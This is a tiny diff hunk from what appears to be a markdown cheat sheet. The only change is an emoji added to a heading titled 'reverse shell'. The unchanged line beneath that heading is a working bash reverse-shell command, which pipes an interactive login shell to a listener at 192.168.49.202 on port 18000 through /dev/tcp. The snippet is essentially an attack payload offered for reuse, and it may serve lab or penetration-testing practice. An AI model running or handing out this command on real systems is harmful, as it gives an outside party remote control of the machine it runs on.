@@ -1,4 +1,4 @@
-### reverse shell
+### :open_file_folder: reverse shell
 
 ```
 /bin/bash -l > /dev/tcp/192.168.49.202/18000 0<&1 2>&1
